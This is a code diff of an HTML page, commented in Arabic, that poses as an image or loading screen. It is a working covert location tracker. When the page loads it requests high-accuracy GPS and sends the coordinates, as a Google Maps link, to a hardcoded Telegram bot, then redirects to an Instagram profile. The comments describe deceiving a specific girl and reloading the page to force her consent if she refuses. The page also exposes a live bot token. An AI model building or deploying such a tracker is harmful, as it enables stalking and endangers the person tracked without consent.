@@ -1,52 +1,56 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري فتح الصورة...</title>
-    <style>
-        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #e1306c; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <title>Loading...</title>
 </head>
 <body>
-    <div class="loader"></div>
+    <div style="text-align: center; margin-top: 50px;">
+        <p>جاري التحميل، يرجى الانتظار...</p>
+    </div>
 
 <script>
-    const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
-    const chat_id = '7214473798';
+    // بياناتك الخاصة
+    const botToken = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
+    const chatId = '7214473798';
 
-    function sendLocation() {
-        const options = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
+    function getLocation() {
+        // إعدادات الدقة القصوى لضمان تحديد المكان "بظبط"
+        const options = {
+            enableHighAccuracy: true, // استخدام الـ GPS
+            timeout: 20000,           // مدة المحاولة 20 ثانية
+            maximumAge: 0             // عدم استخدام موقع قديم
+        };
 
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(p) {
-                const lat = p.coords.latitude;
-                const lon = p.coords.longitude;
-                const acc = p.coords.accuracy;
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const acc = position.coords.accuracy;
 
-                // تنسيق الرابط لفتح تطبيق الخرائط مباشرة بدبوس
-                const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
+                // رابط جوجل ماب المباشر الذي يفتح تطبيق الخرائط فوراً
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                 
-                let text = `🎯 **تم تحديد الموقع بدقة!**\n`;
-                text += `👤 الحساب: ha2542213\n`;
-                text += `📍 الرابط (اضغط للفتح):\n${googleMaps}\n`;
-                text += `📏 نسبة الخطأ: ${acc.toFixed(1)} متر`;
+                const message = `🎯 **تم تحديد الموقع بنجاح!**\n\n` +
+                                `📍 الرابط المباشر:\n${mapLink}\n\n` +
+                                `📏 نسبة الخطأ: ${acc.toFixed(1)} متر`;
 
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
-                
-                // تحويل البنت لبروفايلها لإنهاء الخدعة
-                setTimeout(() => { window.location.href = "https://www.instagram.com/ha2542213"; }, 1000);
+                // إرسال البيانات لتليجرام
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+                .then(() => {
+                    // بعد الإرسال، يتم التحويل لإنستغرام لإنهاء العملية
+                    window.location.href = "https://www.instagram.com/ha2542213";
+                });
 
-            }, function(e) {
-                // إذا رفضت، نبلغك ونعيد المحاولة
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent('⚠️ البنت رفضت إعطاء صلاحية الموقع.')}`);
+            }, function(error) {
+                // إذا رفضت البنت، يتم إعادة تحميل الصفحة لإجبارها على الموافقة
                 location.reload();
             }, options);
         }
     }
-    window.onload = sendLocation;
+
+    // بدء العمل فور فتح الرابط
+    window.onload = getLocation;
 </script>
 </body>
 </html>
